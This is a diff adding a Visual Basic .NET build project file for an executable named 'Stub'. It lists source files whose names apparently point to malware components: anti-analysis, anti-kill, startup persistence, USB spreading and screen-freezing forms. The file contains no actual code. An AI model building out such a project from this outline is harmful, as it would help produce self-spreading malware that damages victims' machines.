@@ -1,0 +1,221 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{4677D396-42C2-4C23-B5A4-40F1B3A3375F}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <StartupObject>Application1.My.MyApplication</StartupObject>
+    <RootNamespace>Application1</RootNamespace>
+    <AssemblyName>Stub</AssemblyName>
+    <FileAlignment>512</FileAlignment>
+    <MyType>WindowsForms</MyType>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <TargetFrameworkProfile>
+    </TargetFrameworkProfile>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DefineDebug>true</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>..\..\Bin\</OutputPath>
+    <DocumentationFile>Stub.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <DefineDebug>false</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DocumentationFile>Stub.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionExplicit>On</OptionExplicit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionCompare>Binary</OptionCompare>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionStrict>Off</OptionStrict>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionInfer>On</OptionInfer>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>My Project\app.manifest</ApplicationManifest>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.DirectoryServices" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+  </ItemGroup>
+  <ItemGroup>
+    <Import Include="Microsoft.VisualBasic" />
+    <Import Include="System" />
+    <Import Include="System.Collections" />
+    <Import Include="System.Collections.Generic" />
+    <Import Include="System.Data" />
+    <Import Include="System.Drawing" />
+    <Import Include="System.Diagnostics" />
+    <Import Include="System.Windows.Forms" />
+    <Import Include="System.Linq" />
+    <Import Include="System.Xml.Linq" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="frms\Black_.Designer.vb">
+      <DependentUpon>Black_.vb</DependentUpon>
+    </Compile>
+    <Compile Include="frms\Black_.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="frms\Dupfrm.Designer.vb">
+      <DependentUpon>Dupfrm.vb</DependentUpon>
+    </Compile>
+    <Compile Include="frms\Dupfrm.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="frms\infi_scrn.Designer.vb">
+      <DependentUpon>infi_scrn.vb</DependentUpon>
+    </Compile>
+    <Compile Include="frms\infi_scrn.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="frms\mydickfelloff.Designer.vb">
+      <DependentUpon>mydickfelloff.vb</DependentUpon>
+    </Compile>
+    <Compile Include="frms\mydickfelloff.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="frms\ohnoo.Designer.vb">
+      <DependentUpon>ohnoo.vb</DependentUpon>
+    </Compile>
+    <Compile Include="frms\ohnoo.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="frms\frz.Designer.vb">
+      <DependentUpon>frz.vb</DependentUpon>
+    </Compile>
+    <Compile Include="frms\frz.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Functions\Algo.vb" />
+    <Compile Include="Functions\Antis.vb" />
+    <Compile Include="Functions\c_AntiKill.vb" />
+    <Compile Include="Functions\Disable.vb" />
+    <Compile Include="frms\Form1.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="frms\Form1.Designer.vb">
+      <DependentUpon>Form1.vb</DependentUpon>
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Functions\Genstr.vb" />
+    <Compile Include="Functions\Protect.vb" />
+    <Compile Include="Functions\Startup.vb" />
+    <Compile Include="Functions\Syn.vb" />
+    <Compile Include="My Project\AssemblyInfo.vb" />
+    <Compile Include="My Project\Application.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Application.myapp</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Resources.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Settings.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Functions\USB Spread V2.vb" />
+    <Compile Include="frms\Wendy.Designer.vb">
+      <DependentUpon>Wendy.vb</DependentUpon>
+    </Compile>
+    <Compile Include="frms\Wendy.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Settings.vb" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="frms\Black_.resx">
+      <DependentUpon>Black_.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="frms\Dupfrm.resx">
+      <DependentUpon>Dupfrm.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="frms\Form1.resx">
+      <DependentUpon>Form1.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="frms\infi_scrn.resx">
+      <DependentUpon>infi_scrn.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="frms\mydickfelloff.resx">
+      <DependentUpon>mydickfelloff.vb</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="frms\ohnoo.resx">
+      <DependentUpon>ohnoo.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="frms\frz.resx">
+      <DependentUpon>frz.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="My Project\Resources.resx">
+      <Generator>VbMyResourcesResXFileCodeGenerator</Generator>
+      <CustomToolNamespace>My.Resources</CustomToolNamespace>
+      <SubType>Designer</SubType>
+      <LastGenOutput>Resources.Designer.vb</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="frms\Wendy.resx">
+      <DependentUpon>Wendy.vb</DependentUpon>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+    <None Include="ClassDiagram1.cd" />
+    <None Include="My Project\app.manifest">
+      <SubType>Designer</SubType>
+    </None>
+    <None Include="My Project\Application.myapp">
+      <Generator>MyApplicationCodeGenerator</Generator>
+      <LastGenOutput>Application.Designer.vb</LastGenOutput>
+    </None>
+    <None Include="My Project\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <CustomToolNamespace>My</CustomToolNamespace>
+      <LastGenOutput>Settings.Designer.vb</LastGenOutput>
+    </None>
+    <None Include="Resources\Stub.x" />
+    <None Include="Resources\Stub_A.x" />
+    <None Include="Resources\URLS" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\skul_pic.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\skul_pic.jpeg" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
